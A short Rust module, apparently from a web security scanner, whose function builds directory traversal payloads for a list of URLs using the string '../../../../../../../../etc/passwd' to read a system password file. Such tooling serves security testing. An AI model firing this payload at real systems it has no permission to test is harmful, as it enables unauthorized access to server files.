
use crate::objects::payload;
use crate::gen::utils;

pub fn generate_directorytp(urls: &[String]) -> Vec<payload::Payload> {
    let script = r#"../../../../../../../../etc/passwd"#;
    utils::generate_p(urls, script)
}

